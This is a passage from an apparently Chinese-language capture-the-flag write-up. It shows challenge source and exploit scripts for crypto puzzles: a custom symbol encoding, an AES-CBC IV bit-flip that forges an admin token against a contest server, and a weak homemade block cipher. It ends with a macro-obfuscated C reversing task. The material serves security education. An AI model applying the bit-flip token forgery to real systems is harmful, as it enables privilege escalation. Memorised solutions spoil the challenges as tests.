IMAUR KFDR MWDJMSB DGIBGWB BEDB RG CMVB MWRG RUB LGSEC GN TSZJRYWYEZDMD.</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkg8-2Ekgg.png" alt="image"><br><img src="https://hackmd.io/_uploads/SytL-n4yle.png" alt="螢幕擷取畫面 2025-04-19 164343"></p>
<h4 id="SNAKE"><a href="#SNAKE" class="headerlink" title="SNAKE"></a>SNAKE</h4><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSSSS = <span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="string">&quot;!@#$%^&amp;*()&#123;&#125;[]:;&quot;</span>[<span class="built_in">int</span>(x, <span class="number">2</span>)] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">ord</span>(c):08b&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> SSSSS)[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(SSSSS) * <span class="number">8</span>, <span class="number">4</span>)]]))</span><br></pre></td></tr></table></figure>
<p>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = <span class="string">&quot;^$&amp;:&amp;@&amp;&#125;&amp;^*$#!&amp;@*#&amp;^#!&amp;^&amp;[&amp;;&amp;:&amp;*&amp;@*%&amp;^&amp;%#!&amp;[&amp;)&amp;]&amp;#&amp;[&amp;^*$*$#!*#&amp;^*!*%&amp;)&amp;[&amp;^*$#!&amp;;&amp;&amp;#!*%&amp;(&amp;^#!*$*^&amp;#&amp;;*#&amp;%&amp;^*##!^$&amp;^*#*!&amp;^&amp;:*%&amp;^*$#:#!%$&amp;[&amp;@&amp;%&amp;)*$*%&amp;)&amp;$&amp;@&amp;[&amp;[*)#!*$*@*^&amp;@&amp;]&amp;@*%&amp;^*$#[#!*$&amp;:&amp;@&amp;&#125;&amp;^*$#!&amp;@*#&amp;^#!&amp;^&amp;$*%&amp;;*%&amp;(&amp;^*#&amp;]&amp;)&amp;$#[#!&amp;@&amp;]&amp;:&amp;)&amp;;*%&amp;^#!*&amp;&amp;^*#*%&amp;^&amp;#*#&amp;@*%&amp;^*$#!&amp;$&amp;;*&amp;&amp;^*#&amp;^&amp;%#!&amp;)&amp;:#!&amp;;*&amp;&amp;^*#&amp;[&amp;@*!*!&amp;)&amp;:&amp;*#!*$&amp;$&amp;@&amp;[&amp;^*$#!&amp;]*^&amp;$&amp;(#!&amp;[&amp;)&amp;&#125;&amp;^#!&amp;;*%&amp;(&amp;^*##!&amp;]&amp;^&amp;]&amp;#&amp;^*#*$#!&amp;;&amp;&amp;#!*%&amp;(&amp;^#!&amp;**#&amp;;*^*!#:#!%]&amp;@&amp;:*)#!*$*!&amp;^&amp;$&amp;)&amp;^*$#!&amp;;&amp;&amp;#!*$&amp;:&amp;@&amp;&#125;&amp;^*$#!&amp;(&amp;@*&amp;&amp;^#!*$&amp;&#125;*^&amp;[&amp;[*$#!**&amp;)*%&amp;(#!*$&amp;^*&amp;&amp;^*#&amp;@&amp;[#!&amp;]&amp;;*#&amp;^#!&amp;&#123;&amp;;&amp;)&amp;:*%*$#!*%&amp;(&amp;@&amp;:#!*%&amp;(&amp;^&amp;)*##!&amp;[&amp;)*&#123;&amp;@*#&amp;%#!&amp;@&amp;:&amp;$&amp;^*$*%&amp;;*#*$#!&amp;@&amp;:&amp;%#!*#&amp;^&amp;[&amp;@*%&amp;)*&amp;&amp;^*$#[#!&amp;^&amp;:&amp;@&amp;#&amp;[&amp;)&amp;:&amp;*#!*%&amp;(&amp;^&amp;]#!*%&amp;;#!*$**&amp;@&amp;[&amp;[&amp;;**#!*!*#&amp;^*)#!&amp;]*^&amp;$&amp;(#!&amp;[&amp;@*#&amp;*&amp;^*##!*%&amp;(&amp;@&amp;:#!*%&amp;(&amp;^&amp;)*##!&amp;(&amp;^&amp;@&amp;%*$#!#(&amp;$*#&amp;@&amp;:&amp;)&amp;@&amp;[#!&amp;&#125;&amp;)&amp;:&amp;^*$&amp;)*$#)#:#!^%&amp;;#!&amp;@&amp;$&amp;$&amp;;&amp;]&amp;]&amp;;&amp;%&amp;@*%&amp;^#!*%&amp;(&amp;^&amp;)*##!&amp;:&amp;@*#*#&amp;;**#!&amp;#&amp;;&amp;%&amp;)&amp;^*$#[#!*$&amp;:&amp;@&amp;&#125;&amp;^*$#*#!*!&amp;@&amp;)*#&amp;^&amp;%#!&amp;;*#&amp;*&amp;@&amp;:*$#!#(*$*^&amp;$&amp;(#!&amp;@*$#!&amp;&#125;&amp;)&amp;%&amp;:&amp;^*)*$#)#!&amp;@*!*!&amp;^&amp;@*##!&amp;;&amp;:&amp;^#!&amp;)&amp;:#!&amp;&amp;*#&amp;;&amp;:*%#!&amp;;&amp;&amp;#!*%&amp;(&amp;^#!&amp;;*%&amp;(&amp;^*##!&amp;)&amp;:*$*%&amp;^&amp;@&amp;%#!&amp;;&amp;&amp;#!*$&amp;)&amp;%&amp;^#!&amp;#*)#!*$&amp;)&amp;%&amp;^#[#!&amp;@&amp;:&amp;%#!&amp;]&amp;;*$*%#!&amp;;&amp;:&amp;[*)#!&amp;(&amp;@*&amp;&amp;^#!&amp;;&amp;:&amp;^#!&amp;&amp;*^&amp;:&amp;$*%&amp;)&amp;;&amp;:&amp;@&amp;[#!&amp;[*^&amp;:&amp;*#:#!^$&amp;;&amp;]&amp;^#!*$*!&amp;^&amp;$&amp;)&amp;^*$#!*#&amp;^*%&amp;@&amp;)&amp;:#!&amp;@#!*!&amp;^&amp;[*&amp;&amp;)&amp;$#!&amp;*&amp;)*#&amp;%&amp;[&amp;^#!**&amp;)*%&amp;(#!&amp;@#!*!&amp;@&amp;)*##!&amp;;&amp;&amp;#!*&amp;&amp;^*$*%&amp;)&amp;*&amp;)&amp;@&amp;[#!&amp;$&amp;[&amp;@***$#!&amp;;&amp;:#!&amp;^&amp;)*%&amp;(&amp;^*##!*$&amp;)&amp;%&amp;^#!&amp;;&amp;&amp;#!*%&amp;(&amp;^#!&amp;$&amp;[&amp;;&amp;@&amp;$&amp;@#:#!%[&amp;)*&#123;&amp;@*#&amp;%*$#!&amp;(&amp;@*&amp;&amp;^#!&amp;)&amp;:&amp;%&amp;^*!&amp;^&amp;:&amp;%&amp;^&amp;:*%&amp;[*)#!&amp;^*&amp;&amp;;&amp;[*&amp;&amp;^&amp;%#!&amp;^&amp;[&amp;;&amp;:&amp;*&amp;@*%&amp;^#!&amp;#&amp;;&amp;%&amp;)&amp;^*$#!**&amp;)*%&amp;(&amp;;*^*%#!&amp;[&amp;)&amp;]&amp;#*$#!&amp;;*##!**&amp;)*%&amp;(#!&amp;**#&amp;^&amp;@*%&amp;[*)#!*#&amp;^&amp;%*^&amp;$&amp;^&amp;%#!&amp;[&amp;)&amp;]&amp;#*$#!&amp;@*%#!&amp;[&amp;^&amp;@*$*%#!*%**&amp;^&amp;:*%*)#]&amp;&amp;&amp;)*&amp;&amp;^#!*%&amp;)&amp;]&amp;^*$#!*&amp;&amp;)&amp;@#!&amp;$&amp;;&amp;:*&amp;&amp;^*#&amp;*&amp;^&amp;:*%#!&amp;^*&amp;&amp;;&amp;[*^*%&amp;)&amp;;&amp;:#[#!&amp;[&amp;^&amp;@&amp;%&amp;)&amp;:&amp;*#!*%&amp;;#!&amp;]&amp;@&amp;:*)#!&amp;[&amp;)&amp;:&amp;^&amp;@&amp;*&amp;^*$#!&amp;;&amp;&amp;#!&amp;[&amp;^&amp;*&amp;[&amp;^*$*$#!&amp;[&amp;)*&#123;&amp;@*#&amp;%*$#:#!^%&amp;(&amp;^*$&amp;^#!*#&amp;^*$&amp;^&amp;]&amp;#&amp;[&amp;^#!*$&amp;:&amp;@&amp;&#125;&amp;^*$#[#!&amp;#*^*%#!*$&amp;^*&amp;&amp;^*#&amp;@&amp;[#!&amp;$&amp;;&amp;]&amp;]&amp;;&amp;:#!&amp;**#&amp;;*^*!*$#!&amp;;&amp;&amp;#!&amp;[&amp;^&amp;*&amp;[&amp;^*$*$#!&amp;[&amp;)*&#123;&amp;@*#&amp;%*$#!&amp;(&amp;@*&amp;&amp;^#!&amp;^*)&amp;^&amp;[&amp;)&amp;%*$#!&amp;@&amp;:&amp;%#!&amp;^*(*%&amp;^*#&amp;:&amp;@&amp;[#!&amp;^&amp;@*#*$#[#!**&amp;(&amp;)&amp;$&amp;(#!*$&amp;:&amp;@&amp;&#125;&amp;^*$#!&amp;[&amp;@&amp;$&amp;&#125;#[#!&amp;@&amp;[*%&amp;(&amp;;*^&amp;*&amp;(#!*%&amp;(&amp;)*$#!*#*^&amp;[&amp;^#!&amp;)*$#!&amp;:&amp;;*%#!*^&amp;:&amp;)*&amp;&amp;^*#*$&amp;@&amp;[#!#(*$&amp;^&amp;^#!%@&amp;]*!&amp;(&amp;)*$&amp;#&amp;@&amp;^&amp;:&amp;)&amp;@#[#!%%&amp;)&amp;#&amp;@&amp;]&amp;)&amp;%&amp;@&amp;^#[#!&amp;@&amp;:&amp;%#!^!*)&amp;*&amp;;*!&amp;;&amp;%&amp;)&amp;%&amp;@&amp;^#)#:#!&amp;#&amp;[&amp;@&amp;#&amp;[&amp;@&amp;#&amp;[&amp;@#!%(&amp;^*#&amp;^#!&amp;)*$#!*)&amp;;*^*##!&amp;&amp;&amp;[&amp;@&amp;*$&#123;#!^%%(%&#123;%$%$*&#125;^$%:%@%&#125;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*]&quot;</span></span><br><span class="line">table = <span class="string">&quot;!@#$%^&amp;*()&#123;&#125;[]:;&quot;</span></span><br><span class="line">binary = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciphertext:</span><br><span class="line">    idx = table.index(c)</span><br><span class="line">    binary += <span class="string">f&quot;<span class="subst">&#123;idx:04b&#125;</span>&quot;</span> </span><br><span class="line"></span><br><span class="line">plain = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>):</span><br><span class="line">    byte = binary[i:i+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line">    plain += <span class="built_in">chr</span>(<span class="built_in">int</span>(byte, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ryfiW3Vkgg.png" alt="image"></p>
<h4 id="Yoshino’s-Secret"><a href="#Yoshino’s-Secret" class="headerlink" title="Yoshino’s Secret"></a>Yoshino’s Secret</h4><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    iv = plaintext[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> iv + cipher.encrypt(pad(plaintext[<span class="number">16</span>:], AES.block_size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    iv = ciphertext[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">    plaintext = unpad(cipher.decrypt(ciphertext[<span class="number">16</span>:]), AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = <span class="built_in">bytes</span>.fromhex(token)</span><br><span class="line">        passkey = decrypt(token)</span><br><span class="line">        data = json.loads(passkey)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;admin&quot;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Here is your flag: <span class="subst">&#123;FLAG&#125;</span>&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Access Denied&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hacker detected, emergency shutdown of the system&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    passkey = <span class="string">b&#x27;&#123;&quot;admin&quot;:false,&quot;id&quot;:&quot;TomotakeYoshino&quot;&#125;&#x27;</span></span><br><span class="line">    token = encrypt(os.urandom(<span class="number">16</span>) + passkey)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;token: <span class="subst">&#123;token.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        token = <span class="built_in">input</span>(<span class="string">&quot;token &gt; &quot;</span>)</span><br><span class="line">        check(token)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>要讓密文解密後 false 的地方變 true &#x3D;&gt; bit flip 攻擊<br>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chal.ctf.scint.org&quot;</span>, <span class="number">12002</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;token: &quot;</span>)</span><br><span class="line">token = <span class="built_in">bytes</span>.fromhex(r.recvline().strip().decode())</span><br><span class="line"></span><br><span class="line">iv = token[:<span class="number">16</span>]</span><br><span class="line">ciphertext = token[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">false = <span class="string">b&#x27;false&#x27;</span></span><br><span class="line">true_ = <span class="string">b&#x27;true &#x27;</span></span><br><span class="line"></span><br><span class="line">iv = <span class="built_in">bytearray</span>(iv)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    iv[<span class="number">9</span> + i] ^= false[i] ^ true_[i]</span><br><span class="line"></span><br><span class="line">new_token = <span class="built_in">bytes</span>(iv) + ciphertext</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;token &gt; &quot;</span>, new_token.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/Sywnm2Vyel.png" alt="image"></p>
<h4 id="Speeded-Block-Cipher"><a href="#Speeded-Block-Cipher" class="headerlink" title="Speeded Block Cipher"></a>Speeded Block Cipher</h4><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line">IV = os.urandom(<span class="number">16</span>)</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    padding = <span class="number">16</span> - (<span class="built_in">len</span>(text) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> text + <span class="built_in">bytes</span>([padding]) * padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">B: <span class="built_in">list</span></span>):</span><br><span class="line">    M = [B[i: i + <span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    M[<span class="number">0</span>][<span class="number">1</span>], M[<span class="number">1</span>][<span class="number">1</span>], M[<span class="number">2</span>][<span class="number">1</span>], M[<span class="number">3</span>][<span class="number">1</span>] = M[<span class="number">1</span>][<span class="number">1</span>], M[<span class="number">2</span>][<span class="number">1</span>], M[<span class="number">3</span>][<span class="number">1</span>], M[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    M[<span class="number">0</span>][<span class="number">2</span>], M[<span class="number">1</span>][<span class="number">2</span>], M[<span class="number">2</span>][<span class="number">2</span>], M[<span class="number">3</span>][<span class="number">2</span>] = M[<span class="number">2</span>][<span class="number">2</span>], M[<span class="number">3</span>][<span class="number">2</span>], M[<span class="number">0</span>][<span class="number">2</span>], M[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">    M[<span class="number">0</span>][<span class="number">3</span>], M[<span class="number">1</span>][<span class="number">3</span>], M[<span class="number">2</span>][<span class="number">3</span>], M[<span class="number">3</span>][<span class="number">3</span>] = M[<span class="number">3</span>][<span class="number">3</span>], M[<span class="number">0</span>][<span class="number">3</span>], M[<span class="number">1</span>][<span class="number">3</span>], M[<span class="number">2</span>][<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(M[<span class="number">0</span>] + M[<span class="number">1</span>] + M[<span class="number">2</span>] + M[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_key</span>(<span class="params">K, PS</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(PS - <span class="number">1</span>):</span><br><span class="line">        NK = [(~(x + y)) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(K[i], K[i + <span class="number">1</span>])]</span><br><span class="line">        NK = [(x &gt;&gt; <span class="number">4</span>) | (x &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> x <span class="keyword">in</span> NK]</span><br><span class="line">        NK = shift_rows(NK)</span><br><span class="line">        K.append(NK)</span><br><span class="line">    <span class="keyword">return</span> K[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">plain_block: <span class="built_in">bytes</span>, expand_key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([((x + <span class="number">1</span>) ^ y) &amp; <span class="number">0xff</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(plain_block, expand_key)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    PS = <span class="built_in">len</span>(plaintext) // <span class="number">16</span></span><br><span class="line">    P = [plaintext[i: i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, PS * <span class="number">16</span>, <span class="number">16</span>)]</span><br><span class="line">    K = expand_key([IV, KEY], PS)</span><br><span class="line">    C = []</span><br><span class="line">    <span class="keyword">for</span> i, B <span class="keyword">in</span> <span class="built_in">enumerate</span>(P):</span><br><span class="line">        C.append(add(B, K[i]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(C)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    encrypted_flag = encrypt(pad(FLAG)).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Here is your encrypted flag: <span class="subst">&#123;encrypted_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        plaintext = <span class="built_in">input</span>(<span class="string">&quot;encrypt(hex) &gt; &quot;</span>)</span><br><span class="line">        plaintext = <span class="built_in">bytes</span>.fromhex(plaintext)</span><br><span class="line">        ciphertext = encrypt(pad(plaintext)).<span class="built_in">hex</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ciphertext: <span class="subst">&#123;ciphertext&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>同個 process 的 IV KEY 是固定的，所以 expand_key 也是固定的<br>加密邏輯是明文pad後，逐 byte (明文char + 1) XOR expand_key<br>所以明文都 0，讓密文每 byte 都是 expand_key XOR 1<br>flag 是三個 block，所以輸入 0 也三個 block，密文第四個 block 是 padding 加密產生的，取前三 block 就好<br><img src="https://hackmd.io/_uploads/HyQD33V1lg.png" alt="image"><br>用密文得到 key 再拿來解密 flag<br><img src="https://hackmd.io/_uploads/rJ2rhhEJxe.png" alt="image"></p>
<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="西"><a href="#西" class="headerlink" title="西"></a>西</h4><p><img src="https://hackmd.io/_uploads/HyZ6m2iJgx.png" alt="image"><br>chal.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 掐 char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 伊恩窺皮特_弗雷格 enrypted_flag</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 等於 =</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 佛以德 void</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 低窺皮特 decrypt</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 哀恩踢 int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 小於 &lt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 恩 n</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 佛 for</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 哀 i</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 加加 ++</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 立蘿 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 欸殼斯偶爾等於 ^=</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 欸服費 0xF5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 面 main</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 衣服 <span class="keyword">if</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 欸斯踢阿鏈 strlen</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 鋪因特欸服 printf</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 趴欸斯 <span class="string">&quot;%s&quot;</span></span></span><br><span class="line"></span><br><span class="line">掐 伊恩窺皮特_弗雷格[] 等於 <span class="string">&quot;\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88&quot;</span>;</span><br><span class="line"></span><br><span class="line">佛以德 低窺皮特(哀恩踢 恩)</span><br><span class="line">&#123;</span><br><span class="line">    佛 (哀恩踢 哀 等於 立蘿; 哀 小於 恩; 哀 加加)</span><br><span class="line">    &#123;</span><br><span class="line">        伊恩窺皮特_弗雷格[哀] 欸殼斯偶爾等於 欸服費;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">哀恩踢 面()</span><br><span class="line">&#123;</span><br><span class="line">    衣服 (立蘿)</span><br><span class="line">    &#123;</span><br><span class="line">        低窺皮特(欸斯踢阿鏈(伊恩窺皮特_弗雷格));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    鋪因特欸服(趴欸斯, 伊恩窺皮特_弗雷格);</span><br><span 